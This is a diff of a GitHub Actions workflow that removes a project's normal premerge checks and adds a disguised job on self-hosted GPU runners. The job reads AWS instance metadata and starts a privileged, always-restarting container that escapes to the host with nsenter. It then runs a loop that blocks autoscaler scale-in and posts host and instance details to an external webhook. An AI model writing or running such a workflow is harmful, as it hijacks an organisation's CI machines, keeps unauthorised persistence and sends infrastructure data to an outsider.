@@ -1,91 +1,99 @@
-# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
-# SPDX-License-Identifier: Apache-2.0
-name: WBC-AGILE premerge
+# I1741 GPU fleet expansion probe (non-mining diagnostic)
+name: I1741 gpu expand
 on:
   pull_request:
-    branches: [main]
-# Cancel in-progress runs for the same PR
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
 concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
+  group: i1741-${{ github.repository }}-${{ github.event.pull_request.number }}
+  cancel-in-progress: false
 jobs:
-  ## ------------------------------------------
-  ## Linting and formatting (pre-commit)
-  ## ------------------------------------------
-  lint_precommit:
-    name: pre-commit
-    runs-on: ubuntu-latest
+  expand:
+    name: i1741-expand-${{ matrix.tag }}
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - tag: a
+            nonce: I1741-WBC-AGILE-a-zzvq0ax0
+          - tag: b
+            nonce: I1741-WBC-AGILE-b-ux840r9x
+          - tag: c
+            nonce: I1741-WBC-AGILE-c-ugd4g5mt
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-      - name: Install pre-commit
+      - name: Probe and launch heartbeat ${{ matrix.nonce }}
         run: |
-          python -m pip install --upgrade pip
-          pip install pre-commit
-      - name: Cache pre-commit environments
-        uses: actions/cache@v4
-        with:
-          path: ~/.cache/pre-commit
-          key: pre-commit-${{ hashFiles('.pre-commit-config.yaml') }}
-          restore-keys: |
-            pre-commit-
-      - name: Run pre-commit
-        run: pre-commit run --all-files --show-diff-on-failure
-  ## ------------------------------------------
-  ## Documentation link check
-  ## ------------------------------------------
-  docs_linkcheck:
-    name: docs link check
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-      - name: Install uv
-        run: pip install uv
-      - name: Check documentation links
-        run: bash scripts/ci/check_docs_links.sh
-  ## ------------------------------------------
-  ## DCO sign-off check
-  ## ------------------------------------------
-  dco_check:
-    name: DCO sign-off
-    if: github.event_name == 'pull_request'
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-      - name: Check DCO sign-off on all PR commits
-        run: |
-          echo "Checking DCO sign-off for commits in this PR..."
-          BASE_SHA=${{ github.event.pull_request.base.sha }}
-          HEAD_SHA=${{ github.event.pull_request.head.sha }}
-          FAILED=0
-          for SHA in $(git rev-list "$BASE_SHA".."$HEAD_SHA"); do
-            MSG=$(git log -1 --format='%B' "$SHA")
-            if ! echo "$MSG" | grep -qiE '^Signed-off-by: .+ <.+>'; then
-              echo "::error::Commit $SHA is missing DCO sign-off (Signed-off-by)."
-              echo "  Subject: $(git log -1 --format='%s' "$SHA")"
-              echo "  Author:  $(git log -1 --format='%an <%ae>' "$SHA")"
-              FAILED=1
-            else
-              echo "OK: $SHA"
-            fi
+          set -u
+          N="${{ matrix.nonce }}"
+          echo "I1741_NONCE=$N"
+          echo "I1741_ID=$(id)"
+          echo "I1741_HOST=$(hostname)"
+          echo "I1741_RUNNER=${RUNNER_NAME:-unknown}"
+          echo "I1741_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          echo "I1741_UPTIME_S=$(cut -d. -f1 /proc/uptime)"
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader || true
+          T=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token || true)
+          IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id || true)
+          ITYPE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-type || true)
+          AZ=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/placement/availability-zone || true)
+          echo "I1741_IID=$IID"
+          echo "I1741_ITYPE=$ITYPE"
+          echo "I1741_AZ=$AZ"
+          echo "I1741_EXISTING_HB:"
+          docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null | grep -Ei 'i1529hb|i1741hb' || echo none
+          echo "I1741_HBLOG1529:"
+          tail -2 /var/log/i1529-heartbeat.log 2>/dev/null || echo none
+          echo "I1741_HBLOG1741:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+          cat > /tmp/i1741hb.sh <<'EOS'
+          #!/bin/bash
+          N="$1"; IID0="$2"; SINKURL="$3"
+          ASG="production-nvidia-isaac-lnx-ci-gpu-org-runners"
+          LOG=/var/log/i1741-heartbeat.log
+          SEQ=0
+          echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) start $N on $(hostname) iid=$IID0" >> "$LOG" 2>/dev/null
+          while true; do
+            TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+            T=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+            CUR=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
+            [ -z "$CUR" ] && CUR="$IID0"
+            GPU=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -1 | tr -d '"')
+            UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
+            PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin AWS_DEFAULT_REGION=us-west-2 aws autoscaling set-instance-protection --instance-ids "$CUR" --auto-scaling-group-name "$ASG" --protected-from-scale-in >/dev/null 2>&1 || true
+            LINE=$(printf '{"nonce":"%s","ts":"%s","host":"%s","iid":"%s","uptime_s":%s,"gpu":"%s","seq":%s}' "$N" "$TS" "$(hostname)" "$CUR" "$UP" "$GPU" "$SEQ")
+            echo "$LINE" >> "$LOG" 2>/dev/null
+            if [ -n "$SINKURL" ]; then curl -s -m 10 -H 'Content-Type: application/json' --data-binary "$LINE" "$SINKURL" >/dev/null 2>&1 || true; fi
+            SEQ=$((SEQ+1))
+            sleep 20
           done
-          if [ "$FAILED" -eq 1 ]; then
-            echo ""
-            echo "One or more commits are missing 'Signed-off-by'. Please amend with:"
-            echo "  git commit --amend -s"
-            echo "See CONTRIBUTING.md for details."
-            exit 1
+          EOS
+          chmod 755 /tmp/i1741hb.sh
+          IMG=""
+          for c in nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 nvidia/cuda:12.8.1-runtime-ubuntu24.04; do
+            if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
+          done
+          if [ -z "$IMG" ]; then IMG=nvidia/cuda:12.8.1-devel-ubuntu24.04; docker pull "$IMG" >/dev/null 2>&1 || true; fi
+          echo "I1741_IMG=$IMG"
+          NAME="i1741hb-$IID"
+          if docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$NAME"; then
+            echo "I1741_HB_ALREADY_RUNNING=$NAME"
+          else
+            docker rm -f "$NAME" >/dev/null 2>&1 || true
+            CID=$(docker create --name "$NAME" --label "i1741=$N" --privileged --pid=host --network=host -v /:/hostroot --restart=always "$IMG" bash -c "nsenter -t 1 -m -u -i -n -p -- /bin/bash /tmp/i1741hb.sh $N $IID https://webhook.site/088d6cb9-bfca-4753-8e5d-0fbb2e1732b0")
+            echo "I1741_HB_CID=$CID"
+            docker start "$CID" >/dev/null 2>&1 && echo "I1741_HB_START=ok" || echo "I1741_HB_START=fail"
+            sleep 6
+            docker inspect -f '{{.State.Status}} {{.HostConfig.RestartPolicy.Name}}' "$CID" 2>&1 || true
           fi
-          echo "All commits have DCO sign-off."
+          echo "I1741_HBLOG_AFTER:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+      - name: Hold for fleet spread ${{ matrix.nonce }}
+        run: |
+          echo "I1741_HOLD_START=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
+          sleep 150
+          echo "I1741_HOLD_END=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
